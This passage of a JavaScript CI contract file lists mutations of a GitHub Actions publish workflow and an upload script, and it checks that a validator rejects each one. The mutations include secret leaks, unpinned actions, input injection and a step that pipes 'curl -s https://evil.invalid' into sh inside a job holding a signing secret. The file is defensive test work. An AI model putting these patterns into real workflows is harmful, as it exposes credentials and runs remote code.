  ["guard no longer exits", edit((j) => { j.guard.steps[0].run = j.guard.steps[0].run.replaceAll("exit 1", "true"); })],
  ["plan escapes the guard", edit((j) => { j.plan.needs = []; })],
  ["verify requests id-token", edit((j) => { j.verify.permissions = { contents: "read", "id-token": "write" }; })],
  ["pack reads a secret", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }; })],
  ["verify reads a secret", edit((j) => { j.verify.steps.at(-3).env = { ...(j.verify.steps.at(-3).env ?? {}), CARGO_REGISTRY_TOKEN: "${{ secrets.CARGO_REGISTRY_TOKEN }}" }; })],
  // The reviewer-approved artifact list (ci/approved-artifacts.json) is checked in seal-check (no secret) and again in upload.
  // pack builds only the planned units and their dependency closure.
  ["pack builds the whole workspace", edit((j) => { j.pack.steps.find((s) => s.run?.trim() === PACK_BUILD_RUN).run = "pnpm -r --workspace-concurrency=1 run build"; })],
  ["pack builds the whole workspace in the install step", edit((j) => { const s = j.pack.steps.find((x) => x.run?.trim() === "pnpm install --frozen-lockfile"); s.run = "pnpm install --frozen-lockfile\npnpm -r run build"; })],
  ["pack drops the scoped build", edit((j) => { j.pack.steps = j.pack.steps.filter((s) => s.run?.trim() !== PACK_BUILD_RUN); })],
  ["pack builds after sealing", edit((j) => { const i = j.pack.steps.findIndex((s) => s.run?.trim() === PACK_BUILD_RUN); const [x] = j.pack.steps.splice(i, 1); j.pack.steps.splice(-1, 0, x); })],
  ["the pack build step is given another unit list", edit((j) => { j.pack.steps.find((s) => s.run?.trim() === PACK_BUILD_RUN).env.PUBLISH_UNITS = "@rightkit/all"; })],
  ["the pack build step runs for crates too", edit((j) => { delete j.pack.steps.find((s) => s.run?.trim() === PACK_BUILD_RUN).if; })],
  ["top-level permissions widen", edit((_, d) => { d.permissions = { contents: "write" }; })],
  ["a push trigger appears", edit((_, d) => { d.on.push = { branches: ["main"] }; })],
  ["pull_request_target appears", edit((_, d) => { d.on.pull_request_target = {}; })],
  ["an action is unpinned", edit((j) => { j.verify.steps[0].uses = "actions/checkout@v7"; })],
  ["a checkout keeps credentials", edit((j) => { j.verify.steps[0].with["persist-credentials"] = "true"; })],
  ["an input is interpolated into a script", edit((j) => { j.verify.steps.at(-3).run = 'echo "${{ inputs.units }}"'; })],
  ["plan stops running the contract", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !/workflow-contract/.test(s.run ?? "")); })],
  ["verify skips the unit gate", edit((j) => { j.verify.steps = j.verify.steps.filter((s) => !/gate\.mjs/.test(s.run ?? "")); })],
  ["verify receipt loses its managed Chrome root", edit((j) => { delete j.verify.steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.RIGHTKIT_CHROME_FOR_TESTING_ROOT; })],
  ["verify receipt uses another Chrome root", edit((j) => { j.verify.steps.find((s) => /publish\.mjs verify/.test(s.run ?? "")).env.RIGHTKIT_CHROME_FOR_TESTING_ROOT = `${RT}/other-chrome`; })],
  ["verify skips the receipt", edit((j) => { j.verify.steps = j.verify.steps.filter((s) => !/publish\.mjs verify/.test(s.run ?? "")); })],
  ["verify may be skipped by a condition", edit((j) => { j.verify.if = "${{ always() }}"; })],
  ["a job has no timeout", edit((j) => { delete j.pack["timeout-minutes"]; })],
  // Condition and secret-expression bypasses (each is valid GitHub expression syntax).
  ["pack reads a bracket-form secret", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), T: "${{ secrets['CARGO_REGISTRY_TOKEN'] }}" }; })],
  ["verify reads a double-quoted bracket-form secret", edit((j) => { j.verify.steps.at(-3).env = { ...(j.verify.steps.at(-3).env ?? {}), T: '${{ secrets["CARGO_REGISTRY_TOKEN"] }}' }; })],
  ["verify reads toJSON(secrets)", edit((j) => { j.verify.steps.at(-3).env = { ...(j.verify.steps.at(-3).env ?? {}), ALL: "${{ toJSON(secrets) }}" }; })],
  ["pack reads the bare secrets context", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), ALL: "${{ secrets }}" }; })],
  ["a verify step condition reads a secret", edit((j) => { j.verify.steps[1].if = "${{ secrets.NPM_TOKEN != '' }}"; })],
  ["a verify checkout takes a secret as with.token", edit((j) => { j.verify.steps[0].with.token = "${{ secrets.NPM_TOKEN }}"; })],
  ["plan calls secrets: inherit", edit((j) => { j.plan.secrets = "inherit"; })],
  ["a job calls a reusable workflow", edit((j) => { j.pack.uses = "./.github/workflows/other.yml"; })],
  ["workflow-level env holds a secret", edit((_, d) => { d.env = { T: "${{ secrets.NPM_TOKEN }}" }; })],
  ["the Chrome pin step is told it is always a dry run", edit((j) => { j.verify.steps.find((x) => /provision-chrome/.test(x.run ?? "")).env.PUBLISH_DRY_RUN = "true"; })],
  ["the Chrome pin step loses its dry-run flag", edit((j) => { delete j.verify.steps.find((x) => /provision-chrome/.test(x.run ?? "")).env.PUBLISH_DRY_RUN; })],
  // The privileged job is closed (audit finding 18): environment, step keys, `with` keys, step list and job keys.
  // sign-swap and the secretless pack.
  ["the signing secret leaks into pack", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), APPLE_CERTIFICATE_BASE64: "${{ secrets.APPLE_CERTIFICATE_BASE64 }}" }; })],
  ["pack joins the release environment", edit((j) => { j.pack.environment = "release"; })],
  ["pack builds the swap itself", edit((j) => { j.pack.steps.splice(-1, 0, { name: "build swap", run: "cargo build --release -p rightkit-fs --bin rightkit-swap" }); })],
  ["pack signs the swap itself", edit((j) => { j.pack.steps.splice(-1, 0, { name: "sign", run: "codesign --force --sign - packages/release/bin/darwin/rightkit-swap" }); })],
  ["pack downloads the swap from another run", edit((j) => { j.pack.steps.find((s) => s.with?.name === SIGN_SWAP_ARTIFACT).with["run-id"] = "1"; })],
  ["pack downloads the swap with a token", edit((j) => { j.pack.steps.find((s) => s.with?.name === SIGN_SWAP_ARTIFACT).with["github-token"] = "${{ secrets.NPM_TOKEN }}"; })],
  ["pack stops re-checking the swap hash", edit((j) => { const s = j.pack.steps.find((x) => /install -m 0755/.test(x.run ?? "")); s.run = s.run.replace("sha256sum -c", "true"); })],
  ["pack places the swap after packing", edit((j) => { const i = j.pack.steps.findIndex((x) => /install -m 0755/.test(x.run ?? "")); const [x] = j.pack.steps.splice(i, 1); j.pack.steps.splice(-1, 0, x); })],
  ["pack no longer needs sign-swap", edit((j) => { j.pack.needs = j.pack.needs.filter((n) => n !== "sign-swap"); })],
  ["pack runs after a failed sign-swap", edit((j) => { j.pack.if = withoutTerm(j.pack.if, SWAP_OK_OR_SKIPPED); })],
  ["pack no longer needs a green plan", edit((j) => { j.pack.if = j.pack.if.replace("needs.plan.result == 'success' && ", ""); })],
  ["sign-swap reads the npm token", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).env.NODE_AUTH_TOKEN = "${{ secrets.NPM_TOKEN }}"; })],
  ["sign-swap reads a secret in a second step", edit((j) => { j["sign-swap"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.X = "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}"; })],
  ["the swap build step gets a secret", edit((j) => { j["build-swap"].steps.find((s) => /cargo build /.test(s.run ?? "")).env = { T: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}" }; })],
  ["sign-swap rebuilds after receiving secrets", edit((j) => { j["sign-swap"].steps.splice(3, 0, { run: "cargo build --release" }); })],
  ["sign-swap requests id-token", edit((j) => { j["sign-swap"].permissions = { contents: "read", "id-token": "write" }; })],
  ["sign-swap loses its environment", edit((j) => { delete j["sign-swap"].environment; })],
  ["sign-swap runs on another host", edit((j) => { j["sign-swap"]["runs-on"] = "ubuntu-24.04"; })],
  ["sign-swap runs for crates runs too", edit((j) => { j["sign-swap"].if = "${{ needs.plan.outputs.count != '0' }}"; })],
  ["sign-swap uses another identity", edit((j) => { j["sign-swap"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.APPLE_DEVELOPER_ID = "-"; })],
  ["sign-swap drops the hardened runtime", edit((j) => { const s = j["sign-swap"].steps.find((x) => /codesign --force/.test(x.run ?? "")); s.run = s.run.replace(" --options runtime", ""); })],
  ["sign-swap keeps the keychain", edit((j) => { j["sign-swap"].steps = j["sign-swap"].steps.filter((s) => !/security delete-keychain/.test(s.run ?? "")); })],
  ["sign-swap uses an unlisted action", edit((j) => { j["sign-swap"].steps.splice(2, 0, actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
  ["sign-swap hands over another path", edit((j) => { j["sign-swap"].steps.find((s) => /upload-artifact/.test(s.uses ?? "")).with.path = "target"; })],
  ["sign-swap secret step runs downloaded code", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).run += "\ncurl -s https://evil.invalid | sh"; })],
  // The licence gate (rightkit#264).
  ["the deny gate is removed", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !/cargo deny/.test(s.run ?? "")); })],
  ["the deny install is removed", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !(s.uses ?? "").startsWith("taiki-e/install-action@")); })],
  ["deny moves to pack", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.pack.steps.push(x); })],
  ["deny runs before the plan step", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.plan.steps.splice(0, 0, x); })],
  ["the deny gate also runs for npm", edit((j) => { j.plan.steps.find((s) => /cargo deny/.test(s.run ?? "")).if = "${{ contains(format(' {0} ', steps.plan.outputs.units), ' rightkit-typeset ') }}"; })],
  ["the deny gate ignores rightkit-typeset", edit((j) => { j.plan.steps.find((s) => /cargo deny/.test(s.run ?? "")).if = "${{ inputs.registry == 'npm' }}"; })],
  ["the deny gate is made non-fatal", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = `${s.run} || true`; })],
  ["the deny gate checks another crate", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = s.run.replace("rightkit-typeset", "rightkit-fs"); })],
  ["the deny gate checks advisories not licences", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = s.run.replace(" licenses", " advisories"); })],
  ["the deny checker is unpinned", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).uses = "taiki-e/install-action@v2"; })],
  ["the deny checker version floats", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.tool = "cargo-deny"; })],
  ["the deny install gains a token", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.token = "${{ secrets.NPM_TOKEN }}"; })],
  ["plan uses an unlisted action", edit((j) => { j.plan.steps.push(actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
  ...CONDITION_MUTATIONS,
  ...LINUX_MUTATIONS,
];

/** Returns the names of mutations the contract failed to reject (empty when every one is caught). */
export function proveMutations(doc) {
  assertPublishDoc(doc);
  const survivors = [];
  for (const [name, mutate] of MUTATIONS) {
    const copy = structuredClone(doc);
    try { mutate(copy); } catch (error) { throw new Error(`mutation "${name}" could not be applied: ${error.message}`); }
    try { assertPublishDoc(copy); survivors.push(name); } catch { /* rejected, as required */ }
  }
  return survivors;
}

// ---- the uploader's reviewer-approval gate ------------------------------------------------------
// The workflow cannot show that scripts/ci/upload.mjs still refuses an unapproved artifact, so the script's own
// gate is pinned here as well: the approval check must run inside executeUpload, unconditionally, before the
// refusal point and before anything is reconciled, spawned or sent; the approved file's path must be fixed
// relative to the script (no environment, input or default can name another file); and the checker must
// still compare registry, name, version and sha256 for every sealed unit. proveUploadScriptMutations shows
// that removing or weakening any of this is rejected. Behaviour is proven by scripts/ci/publish.test.mjs.
const CONTEXT_GUARD = 'if (!dryRun && !candidateContext) throw new Error("real upload requires an admitted authenticated candidate context");';
const APPROVAL_CALL = "problems.push(...checkApprovedArtifacts({ manifest, registry, approvedFile }));";
const APPROVED_PATH_LINE = 'export const APPROVED_ARTIFACTS_FILE = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..", "ci", "approved-artifacts.json");';
const UNIT_LOOP = "const names = new Set();\n  for (const unit of manifest.units) {";

export function assertUploadScript(text, name = "upload.mjs") {
  // Git may check this source out with CRLF on Windows. The contract is about JavaScript
  // structure, so compare canonical line endings while retaining every exact source invariant.
  text = text.replace(/\r\n?/g, "\n");
  const problems = [];
  const check = (ok, message) => { if (!ok) problems.push(message); };
  const start = text.indexOf("export async function executeUpload(");
  const mainAt = text.indexOf("\nif (process.argv[1]");
  check(start >= 0 && mainAt > start, "executeUpload and the command entry must both exist");
  const header = start >= 0 ? text.slice(start, text.indexOf("\n", start)) : "";
  const body = start >= 0 && mainAt > start ? text.slice(start, mainAt) : "";
  const main = mainAt >= 0 ? text.slice(mainAt) : "";
  check(/\bapprovedFile\b/.test(header) && !/\bapprovedFile\s*=/.test(header), "executeUpload must take approvedFile with no default (a missing approval file refuses)");
  check(body.split(APPROVAL_CALL).length === 2 && body.includes(`\n    ${APPROVAL_CALL}`), "executeUpload must run checkApprovedArtifacts exactly once, unconditionally, in the manifest checks");
  const contextAt = body.indexOf(CONTEXT_GUARD);
  check(contextAt >= 0 && body.indexOf("  const previous =") > contextAt, "real uploads must require admitted authenticated candidate context before registry access");
  check(body.includes('archiveScanResolver = assertAuthenticatedContext(candidateContext, { env, packDir, receiptsDir, approvedFile });'), "candidate context must pass authenticated admission validation");
  const callAt = body.indexOf(APPROVAL_CALL);
  const refuseAt = body.indexOf("throw new Error(`sealed upload refused");
  const firstEffect = Math.min(...["reconcileUnit({", 'spawn("npm"', "fetchImpl(CRATES_PUBLISH_URL", "new Receipt("].map((s) => { const i = body.indexOf(s); return i < 0 ? Infinity : i; }));
  check(contextAt >= 0 && contextAt < firstEffect, "admitted context guard must precede any registry or receipt effect");
  check(callAt >= 0 && refuseAt > callAt && firstEffect > refuseAt, "the approval check must come before the refusal point, and the refusal before any reconciliation, receipt, spawn or request");
  check(text.includes(APPROVED_PATH_LINE) && (text.match(/APPROVED_ARTIFACTS_FILE\s*=/g) ?? []).length === 1, "the approved-artifacts path must be fixed relative to upload.mjs (ci/approved-artifacts.json)");
  check(main.includes("approvedFile: APPROVED_ARTIFACTS_FILE,") && !/approvedFile:\s*(?!\s|APPROVED_ARTIFACTS_FILE,)/.test(main), "the command entry must pass approvedFile: APPROVED_ARTIFACTS_FILE");
  const fnAt = text.indexOf("export function checkApprovedArtifacts(");
  const fn = fnAt >= 0 ? text.slice(fnAt, text.indexOf("\n}\n", fnAt)) : "";
  check(fn.includes(UNIT_LOOP) && fn.includes("e.registry === registry && e.name === unit.name && e.version === unit.version") && fn.includes("if (matches.length === 0) problems.push(") && fn.includes("matches.some((e) => e.sha256 !== unit.sha256)") && fn.includes("manifest.units.length === 0"), "checkApprovedArtifacts must require, for every sealed unit, an entry with the same registry, name, version and sha256");
  if (problems.length) throw new Error(`${name} drops the reviewer-approval gate:\n  - ${problems.join("\n  - ")}`);
  return true;
}

const textEdit = (from, to) => (text) => { if (!text.includes(from)) throw new Error(`mutation anchor not found: ${from.slice(0, 50)}`); return text.replace(from, () => to); };
export const UPLOAD_SCRIPT_MUTATIONS = [
  ["real upload loses its admitted context guard", textEdit(CONTEXT_GUARD, "")],
  ["candidate context bypasses authentication", textEdit("archiveScanResolver = assertAuthenticatedContext(candidateContext, { env, packDir, receiptsDir, approvedFile });", "archiveScanResolver = undefined;")],
  ["the approval check is removed", textEdit(APPROVAL_CALL, "")],
  ["the approval check only runs for a real upload", textEdit(APPROVAL_CALL, `if (!dryRun) ${APPROVAL_CALL}`)],
  ["the approval check only runs for a dry run", textEdit(APPROVAL_CALL, `if (dryRun) ${APPROVAL_CALL}`)],
  ["the approval check runs after the refusal point", (text) => textEdit("\n  const previous =", `\n  ${APPROVAL_CALL}\n  const previous =`)(textEdit(APPROVAL_CALL, "")(text))],
  ["a missing approvedFile defaults to nothing", textEdit("receiptsDir, approvedFile,", "receiptsDir, approvedFile = null,")],
  ["the approved path comes from the environment", textEdit(APPROVED_PATH_LINE, "export const APPROVED_ARTIFACTS_FILE = process.env.APPROVED_ARTIFACTS_FILE;")],
  ["the command entry stops passing approvedFile", textEdit("approvedFile: APPROVED_ARTIFACTS_FILE, ", "")],
  ["the command entry passes another file", textEdit("approvedFile: APPROVED_ARTIFACTS_FILE,", "approvedFile: process.env.APPROVED_ARTIFACTS_FILE,")],
  ["the approved hash is no longer compared", textEdit("matches.some((e) => e.sha256 !== unit.sha256)", "false")],
  ["an unapproved unit is allowed", textEdit("if (matches.length === 0) problems.push(", "if (false) problems.push(")],
  ["no sealed unit is checked", textEdit(UNIT_LOOP, "const names = new Set();\n  for (const unit of []) {")],
  ["the version is not matched", textEdit("e.name === unit.name && e.version === unit.version", "e.name === unit.name")],
  ["an empty manifest is accepted", (text) => {
    // Target approval's guard, not another helper's identical length check.
    const start = text.indexOf("export function checkApprovedArtifacts(");
    const end = text.indexOf("\n}\n", start);
    if (start < 0 || end < 0) throw new Error("approval function mutation anchor not found");
    return text.slice(0, start) + textEdit("manifest.units.length === 0", "false")(text.slice(start, end)) + text.slice(end);
  }],
];

/** Returns the names of upload-script mutations assertUploadScript failed to reject. */
export function proveUploadScriptMutations(text) {
  // Keep mutation anchors LF-based on Windows checkouts, matching assertUploadScript.
  text = text.replace(/\r\n?/g, "\n");
  assertUploadScript(text);
  const survivors = [];
  for (const [name, mutate] of UPLOAD_SCRIPT_MUTATIONS) {
    try { assertUploadScript(mutate(text)); survivors.push(name); } catch (error) { if (/mutation anchor not found/.test(error.message)) throw new Error(`upload script mutation "${name}" could not be applied: ${error.message}`); }
  }
  return survivors;
}

if (process.argv[1] && fs.realpathSync(process.argv[1]) === fs.realpathSync(fileURLToPath(import.meta.url))) {
  const file = process.argv[2];
  if (!file) { process.stderr.write("usage: workflow-contract.mjs <publish.yml>\n"); process.exit(2); }
  try {
    const doc = parseYaml(fs.readFileSync(file, "utf8"));
    assertPublishDoc(doc, file);
    const survivors = proveMutations(doc);
    if (survivors.length) throw new Error(`the contract accepts these violations: ${survivors.join("; ")}`);
    process.stdout.write(`${file}: publish contract holds; ${MUTATIONS.length} mutations rejected\n`);
    const uploader = fs.readFileSync(fileURLToPath(new URL("./upload.mjs", import.meta.url)), "utf8");
    const scriptSurvivors = proveUploadScriptMutations(uploader);
    if (scriptSurvivors.length) throw new Error(`the uploader gate accepts these violations: ${scriptSurvivors.join("; ")}`);
    process.stdout.write(`upload.mjs: reviewer-approval gate holds; ${UPLOAD_SCRIPT_MUTATIONS.length} mutations rejected\n`);
  } catch (error) { process.stderr.write(`${error.message}\n`); process.exit(1); }
}
